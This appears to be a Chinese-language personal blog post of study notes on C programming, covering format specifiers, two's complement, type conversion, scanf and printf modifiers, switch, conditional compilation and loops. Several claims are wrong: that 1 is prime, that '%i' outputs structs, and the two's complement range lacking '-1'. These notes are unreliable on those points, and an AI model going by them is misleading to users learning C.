<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230730174232694.png" alt="image-20230730174232694"></p>
<h3 id="算法练习：求一个素数"><a href="#算法练习：求一个素数" class="headerlink" title="算法练习：求一个素数"></a>算法练习：求一个素数</h3><p>素数：除1以外只能被1和它本身整除掉自然数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> input = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入一个自然数：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = input - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span> || i == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1是素数但是0不是素数哦&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (i &lt; <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;老子喊你输入自然数你是听不到是吧？&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (i != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (input % i == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;这个数不是素数哦！&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;这个数是素数哦！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>这样就是一个算法了，当然这个是我自己写的哈。还有其他的练习题，可以自行搜索。</p>
<h1 id="第三章-顺序程序设计"><a href="#第三章-顺序程序设计" class="headerlink" title="第三章 顺序程序设计"></a>第三章 顺序程序设计</h1><h2 id="c语言中常用的占位符"><a href="#c语言中常用的占位符" class="headerlink" title="c语言中常用的占位符"></a>c语言中常用的占位符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%d  整型int</span><br><span class="line"></span><br><span class="line">%ld  长整型long （int）//long是long int的简写方式</span><br><span class="line"></span><br><span class="line">%lld  长长整型long long （int）</span><br><span class="line"></span><br><span class="line">%hd  短整型short int</span><br><span class="line"></span><br><span class="line">%u  无符号整型unsigned int</span><br><span class="line"></span><br><span class="line">%hu  无符号短整型unsigned short int</span><br><span class="line"></span><br><span class="line">%lu  无符号长整形unsigned long int</span><br><span class="line"></span><br><span class="line">%llu  无符号长长整型unsigned long long</span><br><span class="line"></span><br><span class="line">%f  浮点型float</span><br><span class="line"></span><br><span class="line">double比较特殊，它的输入占位符是%lf，输出只能是%f</span><br><span class="line"></span><br><span class="line">%e（E)  以指数形式表示的浮点型</span><br><span class="line"></span><br><span class="line">%m.nf  可控制输出小数位数</span><br><span class="line"></span><br><span class="line">//浮点型也有长短型，可以参考整型</span><br><span class="line"></span><br><span class="line">%c  字符型char</span><br><span class="line"></span><br><span class="line">%s  字符串</span><br><span class="line"></span><br><span class="line">%o  以八进制输出</span><br><span class="line"></span><br><span class="line">%x  以16进制输出</span><br><span class="line"></span><br><span class="line">%p  变量地址</span><br><span class="line"></span><br><span class="line">%i  结构体输出</span><br></pre></td></tr></table></figure>



<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>常量分类:</p>
<p>1.字面常量（直接常量）：数值常量（分为整型常量和浮点型常量），字符串常量和字符常量。</p>
<p>2.符号常量</p>
<p>3.常变量</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//1.整型常量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="number">234</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.浮点型常量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lf,%lf\n&quot;</span>, <span class="number">3.24</span>, <span class="number">3e-2</span>);   <span class="comment">//3e-2代表3的10的-2次方  （就是3×10^-2）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.字符串常量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;%dabc\n&quot;</span>);    <span class="comment">//字符串使用的格式说明符为%s，输出%dabc</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%%dabc\n&quot;</span>);  <span class="comment">//想在printf的格式字符串中输出&quot;百分号&quot;，需要再加一个&quot;百分号&quot;。  输出%abc</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.字符型常量  字符也是以整型方式存储在内存中</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c,%d\n&quot;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);  <span class="comment">//普通字符常量，输出  a,97</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230804073818560.png" alt="image-20230804073818560"></p>
<p>上面是输出，下面是补充的一些转义字符。转义字符中，\r是将当前位置滚回到本行开头。</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230804073624154.png" alt="image-20230804073624154"></p>
<p>下面这五个字符对应的整型数据必须背过</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230804074054206.png" alt="image-20230804074054206"></p>
<p>字面常量讲完了，现在说说符号常量和常变量</p>
<p>符号常量：只存在于预编译阶段，编译阶段就不存在了，经过预编译后，全部变为字面常量。如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  PI  3.14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  ID  101</span></span><br></pre></td></tr></table></figure>

<p>常变量： C99中新增加的内容</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> a = <span class="number">45</span>; <span class="comment">//常变量必须在定义的时候初始化，初始化之后其值不可以被修改（类似php里面那个）</span></span><br></pre></td></tr></table></figure>

<h2 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h2><h3 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h3><p>1.补码：整型以补码的形式存放</p>
<p>（1）一个正数的补码是此数的二进制形式。</p>
<p>求一个正整数的二进制：除以2，直至商为0，余数倒数排序。</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230804195759985.png" alt="image-20230804195759985"></p>
<p>（2）一个负数的补码，先求其绝对值的补码，然后该补码所有位取反，所得之数最后加1</p>
<p>（3）0的补码，所有位全都是0</p>
<p>注意：在存放整型的存储单元中最左边一位是用来b表示符号的（正整数最左边是0，负数是1）</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230804200952781.png" alt="image-20230804200952781"></p>
<p>n位2进制补码能代表的整数范围是<code>-2^(n-1)~2^(n-1)</code></p>
<h3 id="整型数据的存储空间及范围"><a href="#整型数据的存储空间及范围" class="headerlink" title="整型数据的存储空间及范围"></a>整型数据的存储空间及范围</h3><p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230804201730900.png" alt="image-20230804201730900"></p>
<p>有符号的前面只要加一个unsigned就是无符号得了，只能存放自然数。当然有了字节数量，我们就可以通过这个算出他能表示出的整数范围。用上面补码的那个公式。（一个字节等于8位）</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230804203128055.png" alt="image-20230804203128055"></p>
<p>扩展</p>
<h3 id="sizeof"><a href="#sizeof" class="headerlink" title="sizeof"></a>sizeof</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sizeof</span>()<span class="comment">//这个东西不是函数，他是一个单目运算符，他可以求一个数据类型或者数值所占到字节数。其实不用那个圆括号也可以，但是最好或者说是必须加上，避免后续出错。</span></span><br></pre></td></tr></table></figure>



<h3 id="整型数据输出10进制数"><a href="#整型数据输出10进制数" class="headerlink" title="整型数据输出10进制数"></a>整型数据输出10进制数</h3><p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230807140123410.png" alt="image-20230807140123410"></p>
<p>%u是指的就是无符号整型数据。</p>
<h3 id="整数数据输出8进制或16进制"><a href="#整数数据输出8进制或16进制" class="headerlink" title="整数数据输出8进制或16进制"></a>整数数据输出8进制或16进制</h3><p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230807140303345.png" alt="image-20230807140303345"></p>
<p>%o就是8进制，剩下的x就都是16进制，其中的x如果是小写的其输出的结果如果带字母的话也是小写的。</p>
<h3 id="格式说明符表格"><a href="#格式说明符表格" class="headerlink" title="格式说明符表格"></a>格式说明符表格</h3><p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230807140638186.png" alt="image-20230807140638186"></p>
<h3 id="隐式数据转换"><a href="#隐式数据转换" class="headerlink" title="隐式数据转换"></a>隐式数据转换</h3><p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230807141439336.png" alt="image-20230807141439336"></p>
<p>分析一下上面这个代码，<code>-1</code>是一个int类型的数据，占了4个字节，也就是32个二进制位。而<code>-1</code>的补码就是32个1（一个负数的补码，先求其绝对值的补码，然后该补码所有位取反，所得之数最后加1），前面16个1后面16个1。而%hu是短的无符号整型，只占16个2进制位。当占用字节大的赋值给小的时候，只会采取后面16个1。而16个1的二进制对应的10进制就是65535</p>
<p>上面是大字节赋值给短字节，下面我讲讲短的赋值给长的，简单的讲就是把短的全部赋值到长的低几位，长的高几位填0.（下图中的us等于16位的全是1也就是65535）</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230807142214755.png" alt="image-20230807142214755"></p>
<p>现在讲讲占用字节数较短的有符号的数赋值给占用字节较长的数会怎么样，先把“短的”全部内容复制到“长的”低几位，如果“短的”是自然数，“长的”高几位填0，否则，“长的”高几位全部填1.</p>
<p>当然如果等长的话，就会保留原有的补码（补码是重点哦，整数类型的都是通过补码的形式存储在变量里面的。）</p>
<h3 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h3><p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230808201510902.png" alt="image-20230808201510902"></p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230808201520654.png" alt="image-20230808201520654"></p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230808201622786.png" alt="image-20230808201622786"></p>
<h2 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h2><p>字符是以整数形式(ASCII码)存放在内存单元中。ASCII共128个字符(也就是说最多用7位就可以表示)</p>
<p>下面是一些需要记住的对应字符的ascii编码</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230808201847727.png" alt="image-20230808201847727"></p>
<p>值得注意的是一个小写字母比大写字母的asccii码大32</p>
<h3 id="字符型数据的存储空间和值"><a href="#字符型数据的存储空间和值" class="headerlink" title="字符型数据的存储空间和值"></a>字符型数据的存储空间和值</h3><p>字符型数据分为两中类型。<code>signed char</code>和<code>unsigned char</code>也就是有符号的和无符号的类型。</p>
<p>他们两个都是占一个字节。</p>
<p>其中<code>signed char</code>的取值范围是<code>-128~127</code>，而<code>unsigned char</code>的取值范围是<code>0~255</code>.</p>
<p>需要注意两个点:</p>
<p>1：C99把字符型数据作为整型类型的一种。</p>
<p>2.在使用有符号字符型变量时，允许存储的值为负数，但是字符的代码不可能是负值，所以在存储字符时只用到了<code>0~127</code>这一部分。</p>
<h3 id="如何定义字符型变量"><a href="#如何定义字符型变量" class="headerlink" title="如何定义字符型变量"></a>如何定义字符型变量</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">char</span> sc;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> uc;</span><br><span class="line">    <span class="keyword">char</span> ch; <span class="comment">//在vc++中，char类型是signed char类型的，在其他编译器中也有可能是无符号的char类型</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%d,%d\n&quot;</span>, <span class="keyword">sizeof</span>(sc), <span class="keyword">sizeof</span>(uc), <span class="keyword">sizeof</span>(ch));<span class="comment">//输出1，1，1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//分析下段代码的运行结果</span></span><br><span class="line"></span><br><span class="line">    uc = <span class="number">-1</span>;</span><br><span class="line">    ch = <span class="number">255</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%d\n&quot;</span>, ch, uc); <span class="comment">//输出-1，255</span></span><br><span class="line">    <span class="comment">//就相当于定义了一个int变量，输出了这个int变量而已。因为在c99中，字符型变量算作整型数据的一种。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230808202924540.png" alt="image-20230808202924540"></p>
<h3 id="getchar和putchar函数"><a href="#getchar和putchar函数" class="headerlink" title="getchar和putchar函数"></a>getchar和putchar函数</h3><p>getchar和putchar函数包含在stdio.h头文件中。</p>
<p><code>getchar()</code>函数，返回类型为int型，返回值为用户输入的ascii码，出错返回-1.</p>
<p><code>putchar()</code>向屏幕输出一个字符。</p>
<h2 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h2><p>浮点型数据包括：单精度浮点型，双精度浮点型，长双精度浮点型，复数浮点型。主要讲前面三中。</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230808203726504.png" alt="image-20230808203726504"></p>
<p>浮点型数据是以规范化的指数形式存放在内存当中，把小数不封中小数点前的数为0，小数点后第一位数不为0。</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230808203855705.png" alt="image-20230808203855705"></p>
<p>一些小tip</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230808204504489.png" alt="image-20230808204504489"></p>
<p>其中值得注意的是：</p>
<p>当把一个长的浮点型数据赋给一个较短的浮点型b变量时，可能会造成精度的损失。而且在有的编译器中会出现告警。</p>
<h2 id="printf用到的格式附加字符"><a href="#printf用到的格式附加字符" class="headerlink" title="printf用到的格式附加字符"></a>printf用到的格式附加字符</h2><p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230808205013025.png" alt="image-20230808205013025"></p>
<p>如上图，其中d前面的5就是域宽，输出的内容就是5个字符</p>
<p>可以看到是向右对齐的，我们也可以向左对齐。</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230808205204123.png" alt="image-20230808205204123"></p>
<p>看这个，输出的字符占7，然后小数点后面占2个。如果是<code>7.0</code>和<code>7.</code>那么就不会输出小数位。</p>
<h2 id="scanf函数的注意事项-1"><a href="#scanf函数的注意事项-1" class="headerlink" title="scanf函数的注意事项"></a>scanf函数的注意事项</h2><p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230810131803776.png" alt="image-20230810131803776"></p>
<p>因为scanf里面有5，也就是域宽，只取了5位数。</p>
<p>后面输入的678就被后面的getchar()给接收了</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230810133145051.png" alt="image-20230810133145051"></p>
<p>上面这张图，scanf里面有个<code>-5</code>，可以看到并没有接收到我们输入的内容，全部传入到getchar里面了。由此可见，scaf不能使用负数的附加字符</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230810133331697.png" alt="image-20230810133331697"></p>
<p>这个也是一样的，用了小数的附加格式字符，同样没有接收到数据，所以由此可见，scaf也不能使用小数点附加字符。</p>
<p>总结一下</p>
<p>scanf函数不能使用<code>#,-,m.n</code>的格式附加字符。但是scanf可以使用域宽的格式附加字符</p>
<h2 id="运算符-1"><a href="#运算符-1" class="headerlink" title="运算符"></a>运算符</h2><p>自增自减不能用于一个数值，只能用于一个变量。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">i+++j <span class="comment">//这个代表的是(i++)+j</span></span><br><span class="line">    <span class="comment">//但是其他编译器也有可能不是这个结果</span></span><br><span class="line">    <span class="comment">//对于这种不可移植的操作我们应该尽量避免</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230810134246637.png" alt="image-20230810134246637"></p>
<p>对于上面这张图，(double)的含义是将a对数值转化成double，而不是将a这个变量变成double。也就是这个表达式是double，但是a还是原来的a，依然是int。</p>
<h1 id="第四章-选择结构程序设计"><a href="#第四章-选择结构程序设计" class="headerlink" title="第四章 选择结构程序设计"></a>第四章 选择结构程序设计</h1><h2 id="判断2个实型数据是否相等"><a href="#判断2个实型数据是否相等" class="headerlink" title="判断2个实型数据是否相等"></a>判断2个实型数据是否相等</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//我们这里不用==来，用了一个扩展的函数,不在stdio.h里面，所以我们需要从新导入一个库</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">float</span> a = <span class="number">10.2222225</span>, b = <span class="number">2222229</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">fabs</span>(a - b) &lt;= <span class="number">1e-7</span>)  <span class="comment">//这个函数的作用就是求绝对值，他是在math.h库里面的</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;这两个数相等&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;这两个数不相等&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230810135129458.png" alt="image-20230810135129458"></p>
<p>这两个分别是求double和int类型的绝对值。</p>
<h2 id="逻辑型变量"><a href="#逻辑型变量" class="headerlink" title="逻辑型变量"></a>逻辑型变量</h2><p>其实也就是布尔型的数据类型，同时在c语言里面，布尔型也是整型数据的一种。</p>
<p><code>&lt;studbool.h&gt;</code>这个文件中有<code>_Bool</code>这个数据类型，<code>_Bool</code>与bool是同义词，vc++中没有这个头文件</p>
<p>同时布尔型变量也是c99中新增的数据类型，用他所定义的变量，可以用来表示真假，取值范围为1和0.</p>
<p>bool型的数据变量只占一个字节。</p>
<h2 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h2><p>这里我们使用一个”电梯程序”来做示范。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入想到达的楼层：&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> a;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">	<span class="keyword">switch</span> (a) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;上1楼\n&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;上2楼\n&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;上3楼\n&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;<span class="comment">//这个break就会停止，要不然会一直执行下去哈</span></span><br><span class="line">		<span class="comment">//这里case后面跟常量的必须是一个整型类型</span></span><br><span class="line">            <span class="comment">//每一个case后面的内容都不相同</span></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;没有这个楼层&quot;</span>);<span class="comment">//这个就是默认嘛，没有情况的时候就用这个</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="条件编译"><a href="#条件编译" class="headerlink" title="条件编译"></a>条件编译</h2><p>这里使用一个例子来举例子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> ch;</span><br><span class="line">	<span class="keyword">while</span> ((ch = getchar()) != <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 1</span></span><br><span class="line">		<span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">			ch += <span class="number">32</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">		<span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">			ch -= <span class="number">32</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		<span class="built_in">putchar</span>(ch);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个就是把大写字母转成小写字母，小写字母转大写字母。条件编译呢就是那个＃后面的东西，如果if后面跟的表达式为真就编译后面的字符，如果是假就不编译第一个，转而编译第二个。</p>
<p>总而言之，条件编译的功能就是，当程序满足某个条件的时候，才编译某段代码。使用条件编译的时候，要么使用一个数值来作为条件，要么用一个宏定义来作为条件，也就是说是不能用变量来做条件编译的条件的。</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230813214330101.png" alt="image-20230813214330101"></p>
<h2 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h2><p>文件包含指令：</p>
<p>1.#include&lt;文件名&gt; 系统到存放c库函数头文件的目录中寻找要包含的文件，这称之为标准方式</p>
<p>2.#include”文件名” 系统先在用户当前目录中寻找要包含的文件，若找不到，再按标准方式查找。</p>
<p>注意：头文件后缀可以是<code>.h</code> <code>.c </code>或者是没有头文件</p>
<p>当然值得注意的是，包含两次同一个文件，就会执行两次函数，也就是说有可能包含的时候，条件就有可能出现变化。</p>
<h1 id="第五章-循环结构程序设计"><a href="#第五章-循环结构程序设计" class="headerlink" title="第五章 循环结构程序设计"></a>第五章 循环结构程序设计</h1><h2 id="do…while语句"><a href="#do…while语句" class="headerlink" title="do…while语句"></a>do…while语句</h2><p>一般形式</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">	语句&#125;</span><br><span class="line"><span class="keyword">while</span>(表达式);</span><br><span class="line"><span class="comment">//首先执行do，然后再判断，真就继续，假就退出</span></span><br></pre></td></tr></table></figure>

<h2 id="break的作用"><a href="#break的作用" class="headerlink" title="break的作用"></a>break的作用</h2><p>用来中指他所在的最内层的一个循环或者switch语句。</p>
<h2 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h2><p>结束当前单词循环，但是整个大循环不结束（跳转到最内层的一个循环），举个例子。</p>
<p>同时只能在循环语句中使用这个continue。</p>
<p>输出不能被三整除的数字。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="几个小练习"><a href="#几个小练习" class="headerlink" title="几个小练习"></a>几个小练习</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出一个如下的矩阵</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">5</span>; ++j)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, i * j);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230813223350524.png" alt="image-20230813223350524"></p>
<h1 id="第六章-数组"><a href="#第六章-数组" class="headerlink" title="第六章 数组"></a>第六章 数组</h1><h2 id="单位换算"><a href="#单位换算" class="headerlink" title="单位换算"></a>单位换算</h2><p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230813225131350.png" alt="image-20230813225131350"></p>
